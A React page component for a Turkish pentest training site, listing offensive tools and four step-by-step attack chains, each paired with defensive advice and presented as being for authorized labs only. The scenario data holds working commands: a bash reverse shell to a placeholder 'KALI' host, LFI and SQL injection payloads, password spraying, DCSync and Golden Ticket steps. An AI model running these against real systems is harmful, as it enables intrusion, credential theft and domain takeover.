"use client";
import Link from "next/link";
import { Shield, ArrowRight, ChevronDown, ChevronRight, Crosshair, GitBranch } from "lucide-react";
import { useState } from "react";
import { cn } from "@/lib/utils";

// ─── Araçlar (accordion kategorileri) ───────────────────────────────
const toolCategories = [
  {
    id: "bilgi-toplama",
    category: "Bilgi Toplama",
    emoji: "🔍",
    desc: "Pasif/aktif keşif — hedefi tanı, iz bırakma",
    items: [
      { slug: "osint-basics",                       title: "OSINT Temelleri",         desc: "WHOIS, DNS, crt.sh, Wayback — pasif keşif omurgası", level: "Başlangıç" },
      { slug: "osint-basics/shodan-ileri",           title: "Shodan İleri",            desc: "İnternete açık servis arama motoru — dork'lar, API, ICS/SCADA keşfi", level: "Orta" },
      { slug: "osint-basics/theharvester-maltego",  title: "theHarvester & Maltego",  desc: "E-posta/çalışan toplama, Recon-ng, Maltego ilişki grafiği", level: "Orta" },
      { slug: "google-dorking",                      title: "Google Dorking",          desc: "İleri seviye arama operatörleriyle hassas veri keşfi", level: "Orta" },
    ],
  },
  {
    id: "ag-kesfi",
    category: "Ağ Keşfi",
    emoji: "🗺️",
    desc: "Port tarama, servis enum, zafiyet tarama",
    items: [
      { slug: "nmap",       title: "Nmap",       desc: "Ping sweep'ten NSE script motoruna tam ağ tarama", level: "Başlangıç–İleri" },
      { slug: "enum4linux", title: "enum4linux", desc: "SMB/Samba enumeration — kullanıcı, paylaşım, parola politikası", level: "Başlangıç–Orta" },
      { slug: "nessus",     title: "Nessus",     desc: "Kurumsal zafiyet tarayıcı — CVE eşleştirme, doğrulama", level: "Başlangıç–Orta" },
    ],
  },
  {
    id: "web",
    category: "Web Uygulama Güvenliği",
    emoji: "🌐",
    desc: "Dizin keşfi, fuzzing, SQLi, Burp, CMS tarama",
    items: [
      { slug: "gobuster",         title: "Gobuster",               desc: "Dizin, dosya ve DNS alt alan keşfi", level: "Başlangıç" },
      { slug: "ffuf",             title: "ffuf",                   desc: "Hızlı web fuzzer — parametre, header ve yol testi", level: "Orta" },
      { slug: "sqlmap",           title: "SQLMap",                 desc: "SQL injection tespiti ve sömürüsü — WAF atlatmaya kadar", level: "Orta–İleri" },
      { slug: "burpsuite",        title: "Burp Suite",             desc: "Proxy, Repeater ve Intruder ile manuel web analizi", level: "Orta" },
      { slug: "nikto",            title: "Nikto",                  desc: "Web sunucu zafiyet ve yanlış yapılandırma tarayıcısı", level: "Başlangıç" },
      { slug: "wpscan",           title: "WPScan",                 desc: "WordPress eklenti, tema, kullanıcı zafiyet taraması", level: "Orta" },
      { slug: "web-exploitation", title: "Web Sömürü Teknikleri", desc: "LFI/RFI, dosya yükleme bypass, log poisoning, command injection", level: "Orta–İleri" },
    ],
  },
  {
    id: "shell-erisim",
    category: "Shell & Erişim",
    emoji: "💻",
    desc: "Reverse shell, TTY upgrade, dosya transferi",
    items: [
      { slug: "reverse-shells", title: "Reverse Shell & TTY", desc: "Bash/Python/PHP/PowerShell reverse shell + tam etkileşimli TTY", level: "Başlangıç–Orta" },
      { slug: "file-transfer",  title: "Dosya Transferi",     desc: "HTTP, certutil, SMB, scp ile hedefe/hedeften dosya aktarma", level: "Başlangıç–Orta" },
    ],
  },
  {
    id: "parola",
    category: "Parola Saldırıları",
    emoji: "🔑",
    desc: "Online brute force, offline hash kırma",
    items: [
      { slug: "hydra",   title: "Hydra",            desc: "Online brute force — SSH, FTP, HTTP, SMB form saldırıları", level: "Orta" },
      { slug: "john",    title: "John the Ripper",  desc: "Offline hash kırma, /etc/shadow ve özel format desteği", level: "Orta" },
      { slug: "hashcat", title: "Hashcat",          desc: "GPU hızlandırmalı hash kırma — NTLM, Kerberoast, WPA", level: "Orta–İleri" },
    ],
  },
  {
    id: "exploitation",
    category: "Sömürü (Exploitation)",
    emoji: "💥",
    desc: "Public exploit, msfvenom, meterpreter",
    items: [
      { slug: "metasploit", title: "Metasploit Framework", desc: "Exploit, msfvenom payload üretimi ve meterpreter post-exploitation", level: "Orta–İleri" },
    ],
  },
  {
    id: "active-directory",
    category: "Active Directory & İç Ağ",
    emoji: "🏛️",
    desc: "AD saldırı zinciri — LLMNR'den Domain Admin'e",
    items: [
      { slug: "bloodhound", title: "BloodHound",            desc: "AD saldırı yollarını grafiksel haritalama — DA'ya en kısa yol", level: "İleri" },
      { slug: "responder",  title: "Responder",             desc: "LLMNR/NBT-NS zehirleme ile NetNTLMv2 hash yakalama", level: "İleri" },
      { slug: "netexec",    title: "NetExec (CME)",          desc: "İç ağ numaralandırma, Pass-the-Hash ve yanal hareket", level: "İleri" },
      { slug: "impacket",   title: "Impacket & Kerberos",   desc: "secretsdump, psexec, Kerberoasting, AS-REP Roasting", level: "İleri" },
    ],
  },
  {
    id: "post-exploit",
    category: "Post-Exploitation & PrivEsc",
    emoji: "⬆️",
    desc: "Root/SYSTEM'e yetki yükseltme, lateral, pivot",
    items: [
      { slug: "linux-privesc",   title: "Linux PrivEsc",        desc: "LinPEAS, SUID, Sudo, Cron — root'a her yol", level: "Orta–İleri" },
      { slug: "windows-privesc", title: "Windows PrivEsc",      desc: "WinPEAS, token impersonation, servis izinleri, unquoted path", level: "Orta–İleri" },
      { slug: "pivoting",        title: "Pivoting & Tunneling", desc: "SSH tünelleme, proxychains, chisel, ligolo ile iç ağa sıçrama", level: "İleri" },
    ],
  },
  {
    id: "ctf",
    category: "CTF Teknikleri",
    emoji: "🚩",
    desc: "Forensics, kripto, binary — CTF kategorileri",
    items: [
      { slug: "stego-forensics",     title: "Steganografi & Forensics", desc: "binwalk, steghide, exiftool, zsteg, PCAP analizi", level: "Başlangıç–Orta" },
      { slug: "crypto-ctf",          title: "Kriptografi & Encoding",   desc: "Base64/hex, XOR, klasik şifreler, RSA, CyberChef", level: "Başlangıç–İleri" },
      { slug: "binary-exploitation", title: "Binary Exploitation",      desc: "Ghidra, gdb, pwntools, buffer overflow, ret2win", level: "Orta–İleri" },
    ],
  },
  {
    id: "sunucu-saldiri",
    category: "Sunucu Saldırıları",
    emoji: "🖥️",
    desc: "Linux/Windows Server, web ve DB sömürüsü",
    items: [
      { slug: "linux-server",     title: "Linux Server",          desc: "SSH/NFS/Samba sömürüsü, foothold'dan root'a", level: "Başlangıç–İleri" },
      { slug: "windows-server",   title: "Windows Server",        desc: "RDP/WinRM/SMB, credential dump, Domain Admin yolu", level: "Orta–İleri" },
      { slug: "web-servers",      title: "Web Sunucuları",        desc: "Apache/Nginx/IIS — path traversal, yanlış yapılandırma", level: "Orta" },
      { slug: "database-servers", title: "Veritabanı Sunucuları", desc: "MySQL/MSSQL — xp_cmdshell, hash çıkarma, RCE", level: "Orta–İleri" },
    ],
  },
  {
    id: "diger",
    category: "Cloud & Kablosuz & Mobil",
    emoji: "☁️",
    desc: "AWS/Azure, Wi-Fi, Android/iOS pentest",
    items: [
      { slug: "cloud-pentest",  title: "Cloud Pentest",        desc: "S3 bucket, IAM enum, metadata SSRF, ScoutSuite, Pacu", level: "Orta–İleri" },
      { slug: "wifi-pentest",   title: "Wi-Fi Güvenlik Testi", desc: "Monitor mod, handshake yakalama, Evil Twin, Enterprise", level: "Orta–İleri" },
      { slug: "mobile-pentest", title: "Mobil Uygulama",       desc: "APK analizi, Burp araya girme, SSL Pinning bypass, Frida", level: "Orta–İleri" },
    ],
  },
];

// ─── Saldırı Senaryoları ─────────────────────────────────────────────
const scenarios = [
  {
    id: "nmap-smb",
    title: "Nmap → SMB Enum → Password Spray → DA",
    difficulty: "Orta",
    diffColor: "amber",
    target: "Windows Server / Active Directory (iç ağ)",
    desc: "Klasik iç ağ pentest zinciri — ağ taramasından Domain Admin'e.",
    chain: [
      { step: "1", label: "Full Port Scan",    tool: "Nmap",              href: "/red-team/nmap",         detail: "nmap -p- -sV -sC -T4 192.168.1.0/24 → SMB (445), RPC (135), WinRM (5985) tespit" },
      { step: "2", label: "SMB Enumeration",   tool: "enum4linux / CrackMapExec", href: "/red-team/enum4linux", detail: "enum4linux -a 192.168.1.10 → paylaşımlar, kullanıcı listesi, parola politikası (lockout threshold!)" },
      { step: "3", label: "Password Spray",    tool: "NetExec",           href: "/red-team/netexec",      detail: "netexec smb 192.168.1.10 -u users.txt -p 'Şirket2024!' --no-bruteforce → geçerli hesap" },
      { step: "4", label: "İlk Erişim",        tool: "evil-winrm / impacket", href: "/red-team/impacket", detail: "evil-winrm -i IP -u user -p pass → PowerShell shell, ya da psexec.py domain/user:pass@IP" },
      { step: "5", label: "Yetki Yükseltme",  tool: "WinPEAS + BloodHound", href: "/red-team/windows-privesc", detail: "winpeas.exe → zayıf servis | BloodHound SharpHound → 'Shortest Paths to Domain Admins'" },
      { step: "6", label: "DCSync → DA",       tool: "impacket secretsdump", href: "/red-team/impacket",  detail: "secretsdump.py domain/admin:pass@DC_IP → NTLM hash'ler → pass-the-hash ile DC erişimi" },
    ],
    defense: "SMB imzalamayı etkinleştir (GPO). Güçlü parola politikası + MFA. LAPS ile local admin parolalarını farklılaştır. BloodHound ile kendi AD'ni düzenli analiz et.",
  },
  {
    id: "web-lfi-rce",
    title: "Web Keşfi → Dizin → LFI → Log Poisoning → RCE",
    difficulty: "Orta",
    diffColor: "amber",
    target: "Linux Web Sunucu (Apache + PHP)",
    desc: "Web uygulaması zafiyetinden sunucu shell'ine — CTF ve web pentestinde klasik.",
    chain: [
      { step: "1", label: "Keşif & Teknoloji",  tool: "Nikto + Nmap",           href: "/red-team/nikto",          detail: "nmap -sV -p 80,443 IP + nikto -h IP → PHP sürümü, Apache, hata sayfaları, dizin listeleme" },
      { step: "2", label: "Dizin Keşfi",         tool: "Gobuster / ffuf",         href: "/red-team/gobuster",       detail: "gobuster dir -u http://IP -w common.txt → /admin, /backup, /?page= parametresi" },
      { step: "3", label: "LFI Tespiti",         tool: "Burp Suite + Manuel",     href: "/red-team/burpsuite",      detail: "?page=../../../../etc/passwd → LFI var. php://filter ile kaynak kodu oku." },
      { step: "4", label: "Log Poisoning",       tool: "Web Exploitation",        href: "/red-team/web-exploitation", detail: "SSH veya User-Agent'a PHP payload yaz → LFI ile /var/log/apache2/access.log yükle → RCE" },
      { step: "5", label: "Reverse Shell",       tool: "Reverse Shells",          href: "/red-team/reverse-shells", detail: "?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI/4444+0>%261' → nc -lvnp 4444 ile yakala" },
      { step: "6", label: "Linux PrivEsc",       tool: "LinPEAS",                 href: "/red-team/linux-privesc",  detail: "linpeas.sh → sudo -l (GTFOBins!), SUID binary, yazılabilir cron → root" },
    ],
    defense: "Kullanıcı girdisini dosya yoluna dahil etme. PHP: allow_url_include=Off. Web sunucusunu en az yetki ile çalıştır (www-data). WAF + ModSecurity LFI imzaları. Hata mesajlarını kullanıcıya gösterme.",
  },
  {
    id: "ad-zinciri",
    title: "LLMNR Poisoning → Kerberoasting → DCSync → Golden Ticket",
    difficulty: "İleri",
    diffColor: "red",
    target: "Active Directory Domain (iç ağ foothold)",
    desc: "Kurumsal iç ağ pentest'inin kalbi — hash yakalamadan Domain Admin ve kalıcılığa tam AD zinciri.",
    chain: [
      { step: "1", label: "LLMNR Zehirleme",  tool: "Responder",              href: "/red-team/responder",    detail: "responder -I eth0 -rdwv → ağdaki isim çözümleme hatalarını yakala → NetNTLMv2 hash" },
      { step: "2", label: "Hash Kırma",        tool: "Hashcat",                href: "/red-team/hashcat",      detail: "hashcat -m 5600 hash.txt rockyou.txt → NetNTLMv2 → düz parola" },
      { step: "3", label: "AD Haritalama",     tool: "BloodHound",             href: "/red-team/bloodhound",   detail: "SharpHound.exe -c All → bloodhound-python → import et → 'Shortest Path to DA' grafiği" },
      { step: "4", label: "Kerberoasting",     tool: "impacket GetUserSPNs",   href: "/red-team/impacket",     detail: "GetUserSPNs.py domain/user:pass -dc-ip IP -request → SPN hesap hash'leri → hashcat -m 13100" },
      { step: "5", label: "AS-REP Roasting",   tool: "impacket GetNPUsers",    href: "/red-team/impacket",     detail: "GetNPUsers.py domain/ -usersfile users.txt -no-pass → pre-auth yok → hash → kır" },
      { step: "6", label: "DCSync → Golden Ticket", tool: "secretsdump + ticketer", href: "/red-team/impacket", detail: "secretsdump.py -just-dc domain/admin:pass@DC_IP → krbtgt hash → ticketer.py ile Golden Ticket" },
    ],
    defense: "LLMNR/NBT-NS'i GPO ile devre dışı bırak. Güçlü servis hesabı parolası + gMSA kullan. Pre-auth zorunlu kıl. Event ID 4769 (Kerberoast) ve 4768 (AS-REP) SIEM'de izle. Tiered admin modeli uygula.",
  },
  {
    id: "sqli-db",
    title: "SQLi Keşfi → DB Dump → OS Shell",
    difficulty: "Orta",
    diffColor: "amber",
    target: "Web Uygulaması + MSSQL/MySQL Sunucu",
    desc: "SQL injection'dan tablo dump'a, oradan OS komut yürütmeye — OWASP A03.",
    chain: [
      { step: "1", label: "Parametre Fuzzing",   tool: "ffuf + Burp",     href: "/red-team/ffuf",      detail: "ffuf -u 'http://IP/page.php?id=FUZZ' -w sql-payloads.txt → hata mesajı veya yanıt farkı" },
      { step: "2", label: "SQLi Doğrulama",      tool: "Burp Repeater",   href: "/red-team/burpsuite", detail: "' OR '1'='1-- → giriş başarılı | ' AND 1=2-- → farklı yanıt → Boolean-based blind onayı" },
      { step: "3", label: "Otomatik Sömürü",     tool: "SQLMap",          href: "/red-team/sqlmap",    detail: "sqlmap -u 'http://IP/page.php?id=1' --dbs → DB listesi → --dump -D db -T users" },
      { step: "4", label: "Hash Kırma",          tool: "Hashcat / John",  href: "/red-team/hashcat",   detail: "Admin hash çıkar → hashcat -m 0 (MD5) veya -m 3200 (bcrypt) → düz parola → panel girişi" },
      { step: "5", label: "OS Shell (MSSQL)",    tool: "SQLMap --os-shell", href: "/red-team/sqlmap",  detail: "MSSQL: sqlmap --os-shell → xp_cmdshell etkin → PowerShell reverse shell" },
      { step: "6", label: "PrivEsc",             tool: "WinPEAS / LinPEAS", href: "/red-team/windows-privesc", detail: "DB servisi SYSTEM ise zaten yüksek yetki. Değilse winpeas/linpeas → yetki yükselt." },
    ],
    defense: "Parametreli sorgu (prepared statement) — SQLi'nin tek kesin çözümü. WAF, DB hesabına minimum yetki, xp_cmdshell kapalı. Hata mesajlarını kullanıcıya gösterme (verbose error → bilgi sızıntısı).",
  },
];

const levelColor: Record<string, string> = {
  amber: "text-amber-400 bg-amber-500/10 border-amber-500/20",
  red:   "text-red-400 bg-red-500/10 border-red-500/20",
};

// ─── Bileşen ─────────────────────────────────────────────────────────
export default function RedTeamPage() {
  const [openCats, setOpenCats] = useState<Record<string, boolean>>({
    "bilgi-toplama": true,
    "ag-kesfi": true,
  });
  const [tab, setTab] = useState<"araclar" | "senaryolar">("araclar");
  const [openScenario, setOpenScenario] = useState<string | null>(null);

  const toggle = (id: string) =>
    setOpenCats((s) => ({ ...s, [id]: !s[id] }));

  return (
    <div className="p-6 max-w-4xl mx-auto">
      <div className="flex items-center gap-3 mb-2">
        <Shield className="w-7 h-7 text-red-400" />
        <h1 className="text-2xl font-bold text-terminal-white">Red Team</h1>
      </div>
      <p className="text-terminal-comment mb-6 ml-10">
        Ofansif güvenlik araçlarını ve tekniklerini temelden ileri seviyeye öğren.
        <Link href="/metodoloji" className="ml-2 text-xs text-fuchsia-400/70 hover:text-fuchsia-300 transition-colors">
          ← Metodoloji omurgası
        </Link>
      </p>

      {/* Sekme başlıkları */}
      <div className="flex gap-1 mb-6 border-b border-surface-3">
        <button
          onClick={() => setTab("araclar")}
          className={cn("px-4 py-2 text-sm font-semibold transition-colors border-b-2 -mb-px",
            tab === "araclar"
              ? "border-red-500 text-red-300"
              : "border-transparent text-terminal-comment hover:text-terminal-white")}
        >
          <Shield className="w-3.5 h-3.5 inline mr-1.5" />Araçlar
        </button>
        <button
          onClick={() => setTab("senaryolar")}
          className={cn("px-4 py-2 text-sm font-semibold transition-colors border-b-2 -mb-px",
            tab === "senaryolar"
              ? "border-red-500 text-red-300"
              : "border-transparent text-terminal-comment hover:text-terminal-white")}
        >
          <GitBranch className="w-3.5 h-3.5 inline mr-1.5" />Saldırı Senaryoları
        </button>
      </div>

      {/* ARAÇLAR — Accordion */}
      {tab === "araclar" && (
        <div className="space-y-2">
          {toolCategories.map((cat) => {
            const isOpen = openCats[cat.id] ?? false;
            return (
              <div key={cat.id} className="border border-surface-3 rounded-lg overflow-hidden">
                <button
                  onClick={() => toggle(cat.id)}
                  className={cn("w-full flex items-center gap-3 px-4 py-3 text-left transition-colors",
                    isOpen ? "bg-red-500/5" : "hover:bg-surface-2")}
                >
                  <span className="text-base">{cat.emoji}</span>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-semibold text-terminal-white">{cat.category}</span>
                      <span className="text-xs font-mono text-red-400/60 bg-red-500/5 border border-red-500/15 px-1.5 py-0.5 rounded">
                        {cat.items.length} araç
                      </span>
                    </div>
                    <p className="text-xs text-terminal-comment">{cat.desc}</p>
                  </div>
                  {isOpen
                    ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" />
                    : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
                </button>
                {isOpen && (
                  <div className="border-t border-surface-3 grid sm:grid-cols-2 gap-2 p-3 bg-surface-1/50">
                    {cat.items.map((tool) => (
                      <Link key={tool.slug} href={`/red-team/${tool.slug}`} className="group">
                        <div className="module-card border border-surface-3 hover:border-red-500/40 hover:shadow-[0_0_20px_rgba(239,68,68,0.08)] transition-all">
                          <div className="flex items-start justify-between">
                            <h3 className="font-semibold text-terminal-white group-hover:text-red-300 transition-colors text-sm">
                              {tool.title}
                            </h3>
                            <ArrowRight className="w-3.5 h-3.5 text-terminal-comment group-hover:text-red-400 group-hover:translate-x-1 transition-all shrink-0" />
                          </div>
                          <p className="text-xs text-terminal-comment mt-1 leading-relaxed">{tool.desc}</p>
                          <span className="mt-2 inline-block text-xs font-mono text-red-400/70 bg-red-500/5 border border-red-500/15 px-2 py-0.5 rounded">
                            {tool.level}
                          </span>
                        </div>
                      </Link>
                    ))}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}

      {/* SALDIRI SENARYOLARI */}
      {tab === "senaryolar" && (
        <div className="space-y-3">
          <p className="text-xs text-terminal-comment mb-4">
            Tek başına araç bilmek yetmez —{" "}
            <span className="text-red-300">zincirleyen düşünce biçimi</span> seni senior yapan şeydir.
            Tüm senaryolar yalnızca yetkili pentest veya izole lab{" "}
            <span className="text-terminal-cyan">(HTB / THM / CTF)</span> içindir.
          </p>
          {scenarios.map((s) => {
            const isOpen = openScenario === s.id;
            return (
              <div key={s.id} className="border border-surface-3 rounded-lg overflow-hidden">
                <button
                  onClick={() => setOpenScenario(isOpen ? null : s.id)}
                  className={cn("w-full flex items-center gap-3 px-4 py-3 text-left transition-colors",
                    isOpen ? "bg-red-500/5" : "hover:bg-surface-2")}
                >
                  <Crosshair className={cn("w-4 h-4 shrink-0", isOpen ? "text-red-400" : "text-terminal-comment")} />
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap mb-0.5">
                      <span className="text-sm font-semibold text-terminal-white">{s.title}</span>
                      <span className={cn("text-xs font-mono px-1.5 py-0.5 rounded border", levelColor[s.diffColor])}>
                        {s.difficulty}
                      </span>
                    </div>
                    <p className="text-xs text-terminal-comment">{s.target} — {s.desc}</p>
                  </div>
                  {isOpen
                    ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" />
                    : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
                </button>

                {isOpen && (
                  <div className="border-t border-surface-3 p-4 space-y-3 bg-surface-1/50">
                    <div className="space-y-2">
                      {s.chain.map((c, i) => (
                        <div key={c.step} className="flex gap-3">
                          <div className="flex flex-col items-center">
                            <div className="w-6 h-6 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-xs font-mono text-red-400 shrink-0">
                              {c.step}
                            </div>
                            {i < s.chain.length - 1 && (
                              <div className="w-px flex-1 bg-red-500/10 mt-1" />
                            )}
                          </div>
                          <div className="pb-3 min-w-0 flex-1">
                            <div className="flex items-center gap-2 flex-wrap mb-0.5">
                              <span className="text-sm font-semibold text-terminal-white">{c.label}</span>
                              <Link
                                href={c.href}
                                className="text-xs font-mono text-red-400 bg-red-500/5 border border-red-500/20 px-1.5 py-0.5 rounded hover:bg-red-500/15 transition-colors"
                              >
                                {c.tool} →
                              </Link>
                            </div>
                            <p className="text-xs text-terminal-comment font-mono leading-relaxed">{c.detail}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                    <div className="rounded-md border border-blue-500/20 bg-blue-500/5 px-3 py-2">
                      <p className="text-xs text-blue-300/80">
                        <span className="font-semibold text-blue-300">🛡 Savunma: </span>{s.defense}
                      </p>
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
